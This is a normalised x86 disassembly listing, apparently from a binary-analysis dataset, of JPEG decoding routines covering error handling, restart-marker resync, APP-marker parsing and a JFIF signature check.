mov eax [ ebp - 0x4 ]
sub eax 0x100
push eax
call memset
add esp 0xc
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0xff
jg r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x80
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x80
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x8 ]
mov al [ ebp - 0x8 ]
mov [ edx ] al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x200
jge r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
push 0x180
push 0x0
mov ecx [ ebp - 0x4 ]
add ecx 0x200
push ecx
call memset
add esp 0xc
push 0x80
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x380
push ecx
call memcpy
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ eax ] 0xff
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
sub_41a870
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x180 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x4a ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
push 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1a8 ]
call [ ecx ]
add esp 0x8
push 0x2
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18c ]
call [ ecx ]
add esp 0x8
push 0x2
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
call [ ecx ]
add esp 0x8
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x19c ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
call [ ecx + 0x8 ]
add esp 0x4
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x41 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x74 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x10 ]
test edx edx
jne r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x50 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x8 ]
neg eax
sbb eax eax
neg eax
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
add edx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx + 0x10 ] edx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x40 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a0 ]
call [ edx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x4a ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a4 ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x58 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x5a ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
xor eax eax
mov al [ edx + 0x11 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x8 ]
neg edx
sbb edx edx
and edx 0x3
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18c ]
call [ edx ]
add esp 0x8
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x184 ]
call [ edx ]
add esp 0x8
mov edx [ ebp - 0x4 ]
mov al [ edx + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a8 ]
call [ eax ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x2e
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x1a8 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x18 ]
mov [ eax + 0x1a8 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x5a ]
neg ecx
sbb ecx ecx
neg ecx
add ecx 0x1
mov edx [ edx + 0x10 ]
add edx ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx + 0x10 ] edx
sub_41aaa0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x180 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x4a ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a8 ]
call [ eax + 0x8 ]
add esp 0x4
sub_41aaf0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_41ab90
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] sub_41ac20
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] sub_41abd0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] sub_41ac90
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] sub_41ade0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x68 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x70 ] r--data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] 0x7b
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x78 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x7c ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ab90
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x8 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_420bb0
add esp 0x4
push 0x1
call [ exit@IAT ]
sub_41abd0
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
push edi
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0xc ]
add esp 0x8
lea ecx [ ebp - 0xc8 ]
push ecx
push rw-data
mov edx [ _iob@IAT ]
add edx 0x40
push edx
call [ fprintf@IAT ]
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ac20
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x68 ]
cmp ecx [ ebp + 0xc ]
jl r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
call [ eax + 0x8 ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
call [ edx + 0x8 ]
add esp 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6c ] ecx
jmp r-xdata
sub_41ac90
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x78 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x74 ]
jg r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x7c ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x70 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x80 ]
jg r-xdata
mov eax [ ebp - 0x18 ]
and eax 0xff
test eax eax
je r-xdata
movsx eax [ ebp - 0x14 ]
cmp eax 0x25
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
sub ecx [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x78 ]
mov ecx [ eax + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x2c ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x1c ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0xc ]
push eax
call [ sprintf@IAT ]
add esp 0x28
mov ecx [ ebp - 0x4 ]
add ecx 0x18
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0xc ]
push eax
call [ sprintf@IAT ]
add esp 0xc
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
movsx edx [ ecx ]
cmp edx 0x73
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
mov al [ edx ]
mov [ ebp - 0x14 ] al
movsx ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
sub_41ade0
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x6c ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ae10
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x17c ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x79
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x1c ] eax
push 0xffffffff
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
cmp [ ebp - 0x4 ] 0xd0
jl r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
mov [ ebp - 0x8 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0xd7
jle r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x61
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
push 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
add ecx 0x1
and ecx 0x7
add ecx 0xd0
cmp [ ebp - 0x4 ] ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x17c ] 0x0
mov al 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
je r-xdata
mov [ ebp - 0x8 ] 0x3
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx 0x2
and edx 0x7
add edx 0xd0
cmp [ ebp - 0x4 ] edx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41af90
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x3
je r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x1
and eax 0x7
add eax 0xd0
cmp [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x17c ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
xor al al
jmp r-xdata
mov al 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
sub ecx 0x2
and ecx 0x7
add ecx 0xd0
cmp [ ebp - 0x4 ] ecx
jne r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x4 ] 0xc0
jge r-xdata
sub_41af90
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
sub eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov dl [ ecx ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0xff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x10 ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
xor eax eax
mov al [ edx ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
xor edx edx
test edx edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x8 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x10 ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
xor eax eax
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0xff
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
xor al al
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
xor al al
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
mov edx [ ecx + 0x14 ]
add edx 0x2
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
mov [ ecx + 0x14 ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ edx ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x4 ] edx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x17c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ecx
mov al 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x74
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x194 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ edx + 0x14 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x1c ] edx
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
mov [ ecx + 0x14 ] 0x0
sub_41b1c0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0xa8
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x194 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_41db40
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_41bb40
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] sub_41da60
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] sub_41b9f0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x5c ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x10
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] sub_41b280
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x54 ] sub_41b280
mov edx [ ebp + 0x8 ]
push edx
call sub_41db40
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x1c ] sub_41b9f0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x60 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_41b280
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x28 ]
sub eax 0x1
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x24 ]
xor edx edx
mov dl [ ecx ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x20 ]
call [ ecx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x28 ]
sub ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x24 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
xor eax eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x20 ]
call [ edx + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x28 ] edx
xor al al
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx 0x2
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0xe
jl r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x28 ] eax
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov [ ebp - 0x1c ] 0xe
jmp r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x17c ]
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x2c ] 0xe0
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41b4c0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x2c ] 0xee
je r-xdata
mov edx [ ebp - 0x28 ]
sub edx 0x1
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x24 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x14 ] dl
mov eax [ ebp - 0x24 ]
add eax 0x1
mov [ ebp - 0x24 ] eax
xor ecx ecx
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
call [ eax + 0xc ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x24 ]
mov [ ecx ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x28 ]
mov [ eax + 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41b890
add esp 0x10
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x28 ] ecx
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
call [ edx + 0x10 ]
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x44
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x17c ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
sub_41b4c0
push ebp
mov ebp esp
sub esp 0x4c
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x10 ] 0xe
jb r-xdata
cmp [ ebp + 0x10 ] 0x6
jb r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx ]
cmp edx 0x4a
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x4d
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax + 0x4 ]
add esp 0x8
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
cmp eax 0x4a
jne r-xdata
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x1 ]
cmp ecx 0x46
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x1 ]
cmp edx 0x46
jne r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x2 ]
cmp eax 0x49
